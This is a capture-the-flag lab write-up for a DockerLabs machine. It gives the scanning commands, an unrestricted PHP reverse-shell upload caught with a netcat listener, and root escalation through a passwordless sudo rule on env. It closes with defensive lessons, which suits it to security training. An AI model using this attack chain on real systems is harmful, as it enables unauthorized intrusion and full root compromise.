# Upload - DockerLabs - Easy

## Summary
Upload is an easy Linux Docker container exposing a single web service on port 80. The application hosts a file upload form with no extension or content validation, allowing direct upload of a PHP reverse shell. Once inside as `www-data`, a misconfigured `sudo` rule permits running `/usr/bin/env` as root without a password, leading to immediate privilege escalation.

## Tools
- `nmap`
- `gobuster`
- `netcat (nc)`
- [revshells.com](https://revshells.com) — PHP PentestMonkey payload

---

## 1. Enumeration

### Port Scanning

```sh
nmap -sV -sC -p- 172.17.0.2
```

```
80/tcp open http Apache httpd 2.4.52
```

### Web Enumeration

Navigating to `http://172.17.0.2`, we find a file upload form with no visible restrictions. We run Gobuster to discover additional paths:

```sh
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

```
/upload.php   (Status: 200)
/uploads/     (Status: 301)  ← uploaded files are stored here
```

The `/uploads/` directory is key — it confirms that uploaded files are accessible
and likely executable by Apache.

---

## 2. Exploitation

### Generating the Reverse Shell

We visit [revshells.com](https://revshells.com), select **PHP PentestMonkey**, set our attacker IP and port, and save the payload as `shell.php`.

### Setting Up the Listener

```sh
nc -lvnp 4444
```

### Uploading and Triggering

1. Upload `shell.php` through the form on `http://172.17.0.2`
2. Navigate to `http://172.17.0.2/uploads/shell.php` to trigger execution

We catch a shell as `www-data`.

```sh
whoami
# www-data
```

### Stabilizing the Shell

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

## 3. Privilege Escalation

### Sudo Enumeration

```sh
sudo -l
```

```
User www-data may run the following commands on 4c917b7cc035:
    (root) NOPASSWD: /usr/bin/env
```

`www-data` can run `/usr/bin/env` as root without a password.

### Exploitation (GTFOBins — env)

`env` can execute arbitrary binaries, so we use it to spawn a root shell:

```sh
sudo /usr/bin/env /bin/bash
whoami
# root
```

---

## 4. Lessons Learned

- File upload forms must validate **both extension and MIME type** — filtering only by extension is bypassable; no validation at all is critical.
- Uploaded files should **never be stored in a web-accessible directory** unless strictly necessary, and PHP execution should be disabled in upload directories.
- `sudo NOPASSWD` on `env` is an immediate root escalation — `env` executes any binary and does not drop privileges.
- Always run `sudo -l` as the first post-exploitation step; misconfigured sudo rules are one of the most common privesc vectors in real engagements.
